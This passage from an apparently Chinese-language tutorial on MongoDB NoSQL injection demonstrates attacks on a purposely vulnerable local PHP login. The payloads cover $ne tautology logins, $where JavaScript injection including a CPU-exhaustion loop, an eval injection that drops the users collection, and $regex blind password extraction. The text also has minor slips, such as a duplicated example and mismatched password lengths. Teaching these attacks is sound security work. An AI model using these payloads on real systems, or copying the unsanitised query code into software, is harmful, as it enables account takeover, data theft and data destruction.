&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ef8f8aaaf4f2104914e&quot;), &quot;name&quot; : &quot;bob&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;B&quot;, &quot;groups&quot; : [ &quot;normals&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>以上实例中类似于 RDBMS 中的 WHERE 语句：<code>WHERE status=&#39;B&#39; AND age=20</code></p>
<p>查询时的<strong>OR语句</strong>要在开头加上<code>$or</code></p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()</code></pre>

<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p><strong>联合使用</strong></p>
<p>以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： <code>where age&gt;19 AND (name=&#39;whoami&#39; OR status=&#39;A&#39;)</code></p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;, $or: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9176f8aaaf4f21049150&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<h2 id="注入时间到"><a href="#注入时间到" class="headerlink" title="注入时间到"></a>注入时间到</h2><p>按照语言分类</p>
<p>可以分为</p>
<ul>
<li>PHP数组注入</li>
<li>js注入</li>
<li>mongoshell拼接注入</li>
</ul>
<p>按照攻击机制分类</p>
<p>可以分为</p>
<ul>
<li>重言式注入</li>
<li>联合查询注入</li>
<li>js注入</li>
<li>盲注</li>
</ul>
<hr>
<ul>
<li><strong>重言式注入</strong></li>
</ul>
<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<ul>
<li><strong>联合查询注入</strong></li>
</ul>
<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<ul>
<li><strong>JavaScript 注入</strong></li>
</ul>
<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
<ul>
<li><strong>盲注</strong></li>
</ul>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
<h3 id="PHP中的注入"><a href="#PHP中的注入" class="headerlink" title="PHP中的注入"></a>PHP中的注入</h3><h4 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h4><p>保证一个永真条件即可</p>
<p>首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：</p>
<pre><code class="highlight plaintext">&gt; use test
switched to db test
&gt;
&gt; db.createCollection(&#x27;users&#x27;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;
&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;</code></pre>

<p>然后编写 index.php：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];

$query = new MongoDB\Driver\Query(array(
    &#x27;username&#x27; =&gt; $username,
    &#x27;password&#x27; =&gt; $password
));

$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) &#123;
    foreach ($result as $user) &#123;
        $user = ((array)$user);
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;
        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<p>如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：</p>
<pre><code class="highlight plaintext">username=whoami&amp;password=657260</code></pre>

<p>进入 PHP 后的程序数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,
    &#x27;password&#x27; =&gt; &#x27;657260&#x27;
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;, &#x27;password&#x27;:&#x27;657260&#x27;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</code></pre>

<p>我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 <code>$ne</code> 关键字构造一个永真的条件就可以完成 NoSQL 注入：</p>
<pre><code class="highlight plaintext">username[$ne]=1&amp;password[$ne]=1</code></pre>

<p>如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),
    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</code></pre>

<p>由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。</p>
<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 <code>value=1</code> 那么，也就是发送了一个 <code>value</code> 的值为 1 的数据。如果发送 <code>value[$ne]=1</code> 则 PHP 会将其转换为数组 <code>value=array($ne=&gt;1)</code>，当数据到了进入 MongoDB 后，原来一个单一的 <code>&#123;&quot;value&quot;:1&#125;</code> 查询就变成了一个 <code>&#123;&quot;value&quot;:&#123;$ne:1&#125;</code> 条件查询。同样的，我们也可以使用下面这些作为 payload 进行攻击：</p>
<pre><code class="highlight plaintext">username[$ne]=&amp;password[$ne]=
username[$gt]=&amp;password[$gt]=
username[$gte]=&amp;password[$gte]=</code></pre>

<p>这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。</p>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。</p>
<p>我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
<pre><code class="highlight plaintext">string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot;</code></pre>

<p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
<pre><code class="highlight plaintext">&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;</code></pre>

<p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
<pre><code class="highlight plaintext">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</code></pre>

<p>拼接入查询语句后相当于执行了：</p>
<pre><code class="highlight plaintext">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</code></pre>

<p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
<pre><code class="highlight plaintext">select * from logins where username = &#x27;admin&#x27; and (password true&lt;&gt; or (&#x27;a&#x27;=&#x27;a&#x27; and password = &#x27;&#x27;))</code></pre>

<p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>
<p>但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这种注入方法简单了解一下就好了。</p>
<h4 id="js注入"><a href="#js注入" class="headerlink" title="js注入"></a>js注入</h4><h5 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a>$where 操作符</h5><p>首先我们需要了解一下 <code>$where</code> 操作符。在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以在自定义的函数里获取数据库的所有信息。</p>
<p>如下实例：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot; &#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&gt;</code></pre>

<p>由于使用了 <code>$where</code> 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 <code>$userData</code> 获取查询条件：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</code></pre>

<p>然后，攻击者可能会注入一种恶意的字符串如 <code>&#39;a&#39;; sleep(5000)</code> ，此时 MongoDB 执行的查询语句为：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</code></pre>

<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p>
<p>下面我们编写 index.php 进行测试：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];
$function = &quot;
function() &#123; 
    var username = &#x27;&quot;.$username.&quot;&#x27;;
    var password = &#x27;&quot;.$password.&quot;&#x27;;
    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;&quot;;
$query = new MongoDB\Driver\Query(array(
    &#x27;$where&#x27; =&gt; $function
));
$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username: &#x27;.$user[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;password&#x27;].&quot;&lt;br&gt;&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<ul>
<li><strong>MongoDB 2.4 之前</strong></li>
</ul>
<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#x27;1</code></pre>

<ul>
<li><strong>MongoDB 2.4 之后</strong></li>
</ul>
<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;return true//
或
username=1&amp;password=1&#x27;;return true;var a=&#x27;1</code></pre>

<p>如下图所示，成功查出所有的用户信息：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>这是因为发送 payload 进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;$where&#x27; =&gt; &quot;
    function() &#123; 
        var username = &#x27;1&#x27;;
        var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;
        if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
            return true;
        &#125;else&#123;
            return false;
        &#125;
    &#125;
&quot;)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;$where: &quot;function() &#123; var username = &#x27;1&#x27;;var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123; return true; &#125;else&#123; return false; &#125;&#125;&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;
&gt;</code></pre>

<p>我们从代码中可以看出，password 中的 <code>return true</code> 使得整个 JavaScript 代码提前结束并返回了 <code>true</code>，这样就构造出了一个永真的条件并完成了 NoSQL 注入。</p>
<p>此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();var a=&#x27;1</code></pre>

<h5 id="commmand方法注入"><a href="#commmand方法注入" class="headerlink" title="commmand方法注入"></a>commmand方法注入</h5><p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
<pre><code class="highlight plaintext">&lt;?php
$m = new MongoDB\Driver\Manager;
// Don&#x27;t do this!!!
$username = $_GET[&#x27;field&#x27;];
// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;$cmd = new \MongoDB\Driver\Command( [
&#x27;eval&#x27; =&gt; &quot;print(&#x27;Hello, $username!&#x27;);&quot;
] );

$r = $m-&gt;executeCommand( &#x27;dramio&#x27;, $cmd );?&gt;</code></pre>

<p>也可以用Command去实现Mongo的<code>distinct</code>方法</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager();

$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$cmd = new MongoDB\Driver\Command([
&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;
]);
echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;;
$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();
$result =((array)$result[0])[&#x27;retval&#x27;];
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;用户不存在&#x27;;
&#125;
?&gt;</code></pre>

<p>这个就危险太多了，就相当于把mongo shell开放给用户了，你基本可以构建任何mongo shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建</p>
<pre><code class="highlight plaintext">payload:username=2&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;2</code></pre>



<h5 id="execute方法注入"><a href="#execute方法注入" class="headerlink" title="execute方法注入"></a>execute方法注入</h5><p>在旧版本中，可以用execute来执行一段字符串</p>
<pre><code class="highlight plaintext">&lt;?php

$mongo = new mongoclient();
$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$db = $mongo-&gt;sec_test; // 选择数据库
$query = &quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;.$uname.&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;.$pwd.&quot;&#125;)&quot;;
$result = $db-&gt;execute($query);

if ($result-&gt;count() &gt; 0) &#123;
    foreach ($result as $user) &#123;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;该用户不存在&#x27;;
&#125;
?&gt;</code></pre>

<p>而在新版本中，多用executeQuery来进行查询</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
<span class="string">&#x27;$where&#x27;</span> =&gt; <span class="variable">$function</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;用户不存在&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;uname&#x27;</span>=&gt;<span class="variable">$uname</span>,
    <span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="variable">$pwd</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>



<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
<p>我们还是利用第一个 index.php 进行演示：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span>);
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,
    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();
<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;Login Failed&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=.&#123;4&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;5&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;6&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;7&#125;    // 登录失败
......</code></pre>

<p>在 <code>password[$regex]=.&#123;6&#125;</code> 时可以成功登录，但在 <code>password[$regex]=.&#123;7&#125;</code> 时登录失败，说明该 whoami 用户的密码长度为 7。</p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;admin&#x27;,
    &#x27;password&#x27; =&gt; array(&#x27;$regex&#x27; =&gt; &#x27;.&#123;6&#125;&#x27;)
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;6&#125;&#x27;&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;7&#125;&#x27;&#125;&#125;)
&gt;</code></pre>

<p>由于 whoami 用户的 password 长度为 6，所以查询条件 <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;6&#125;&#39;&#125;&#125;</code> 为真，便能成功登录，而 <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;7&#125;&#39;&#125;&#125;</code> 为假，自然也就登录不了。</p>
<p>知道 password 的长度之后我们便可以逐位提取 password 的字符了：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=1.&#123;5&#125;
username=admin&amp;password[$regex]=12.&#123;4&#125;
username=admin&amp;password[$regex]=123.&#123;3&#125;
username=admin&amp;password[$regex]=1234.&#123;2&#125;
username=admin&amp;password[$regex]=12345.*
username=admin&amp;password[$regex]=123456
或
username=admin&amp;password[$regex]=^1
